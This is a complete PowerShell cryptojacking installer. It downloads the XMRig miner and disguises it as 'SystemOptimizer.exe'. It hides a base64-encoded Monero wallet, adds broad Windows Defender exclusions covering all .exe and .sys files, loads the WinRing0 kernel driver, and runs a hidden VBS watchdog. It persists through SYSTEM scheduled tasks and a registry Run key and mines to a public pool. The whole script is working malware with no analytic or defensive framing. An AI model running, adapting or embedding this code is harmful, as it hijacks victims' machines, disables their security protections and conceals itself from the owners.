#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

# ===== CLEANUP OLD/GLITCHED INSTALLS =====
taskkill /F /IM "wscript.exe" 2>$null
taskkill /F /IM "xmrig.exe" 2>$null
taskkill /F /IM "SystemOptimizer.exe" 2>$null
Remove-Item -Recurse -Force "$env:LOCALAPPDATA\SystemOptimizer" 2>$null
Remove-Item -Recurse -Force "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer" 2>$null
schtasks /Delete /TN "SystemOptimizer" /F 2>$null
schtasks /Delete /TN "SystemOptimizer-Logon" /F 2>$null
schtasks /Delete /TN "ModestFermi_XMRig" /F 2>$null
foreach ($s in @("WinRing0_1_2_0","WinRing0x64")) {
    $es = Get-Service $s -ErrorAction SilentlyContinue
    if ($es) { Stop-Service $s -Force -ErrorAction SilentlyContinue; sc.exe delete $s 2>$null }
}
Start-Sleep 1

# ===== PATHS =====
$baseDir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer"
$xmrigExe = "$baseDir\SystemOptimizer.exe"
$configFile = "$baseDir\config.json"
$driverPath = "$baseDir\WinRing0x64.sys"
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
$zipPath = "$baseDir\xmrig.zip"

# ===== WALLET (base64) =====
$walletB64 = "NDM1c3dVRThodGI5NnhNd1dYYmZuekNYQ2tpS1dRaGNWS3BRempBSHdOTWtpV3hQbnpKaWFpSDgydWNwdm5mZ3BlYkJKOVFNanlWV25GZEY2aWg0MkxWTEpZNTg3d3Y="
$wallet = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($walletB64))

# ===== CREATE DIR =====
New-Item -ItemType Directory -Force -Path $baseDir | Out-Null

# ===== DEFENDER EXCLUSIONS =====
try {
    Add-MpPreference -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "SystemOptimizer.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".sys" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
} catch { }

# ===== DOWNLOAD XMRIG =====
if (-not (Test-Path $xmrigExe)) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($zipUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath "$baseDir\_tmp" -Force
        Move-Item "$baseDir\_tmp\xmrig-6.26.0\xmrig.exe" $xmrigExe -Force
        Move-Item "$baseDir\_tmp\xmrig-6.26.0\WinRing0x64.sys" $driverPath -Force
        Remove-Item "$baseDir\_tmp" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } catch { }
}

# ===== WRITE CONFIG =====
$config = @{
    autosave = $false; background = $true; colors = $false; "donate-level" = 1
    "log-file" = "$baseDir\optimizer.log"; "print-time" = 30
    retries = 5; "retry-pause" = 10
    cpu = @{ enabled=$true; "huge-pages"=$true; "huge-pages-jit"=$true; "hw-aes"=$true; priority=3; yield=$false; asm=$true; "argon2-impl"="auto"; "max-threads-hint"=100 }
    pools = @(@{ url="gulf.moneroocean.stream:10001"; user=$wallet; pass="x"; keepalive=$true; tls=$false; nicehash=$false; "rig-id"=$env:COMPUTERNAME })
    api = @{ enabled=$true; host="127.0.0.1"; port=3456; restricted=$true }
} | ConvertTo-Json -Depth 5
$config | Out-File -FilePath $configFile -Encoding ascii

# ===== INSTALL WINRING0 DRIVER =====
if (Test-Path $driverPath) {
    $svc = "WinRing0_1_2_0"
    $es = Get-Service $svc -ErrorAction SilentlyContinue
    if ($es) { Stop-Service $svc -Force -ErrorAction SilentlyContinue; sc.exe delete $svc 2>$null }
    sc.exe create $svc binPath= "$driverPath" type= kernel start= demand 2>$null
    Start-Service $svc -ErrorAction SilentlyContinue
}

# ===== WATCHDOG.VBS =====
$watchdogPath = "$baseDir\watchdog.vbs"
$wd = @'
Set sh = CreateObject("WScript.Shell")
Set wmi = GetObject("winmgmts:")
If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'").Count > 1 Then WScript.Quit
Do
    Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'")
    If p.Count = 0 Then
        sh.Run """%EXE%"" --config=""%CFG%""", 0, False
    End If
    WScript.Sleep 30000
Loop
'@ -replace '%EXE%', $xmrigExe -replace '%CFG%', $configFile
$wd | Out-File -FilePath $watchdogPath -Encoding ascii

# ===== SCHEDULED TASK (SYSTEM, boot + logon) - using schtasks CLI (reliable from SYSTEM) =====
$taskName = "SystemOptimizer"
$wdPathEscaped = $watchdogPath -replace '"', '`"'
schtasks /Create /TN "$taskName" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
schtasks /Create /TN "$taskName-Logon" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null
schtasks /Change /TN "$taskName" /RI 1 /DU 9999:59 /K 2>$null

# ===== REGISTRY RUN KEY =====
try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"$watchdogPath`"" -Force -ErrorAction SilentlyContinue } catch { }

# ===== START WATCHDOG NOW =====
$wshell = New-Object -ComObject WScript.Shell
$wshell.Run('wscript.exe "' + $watchdogPath + '"', 0, $false)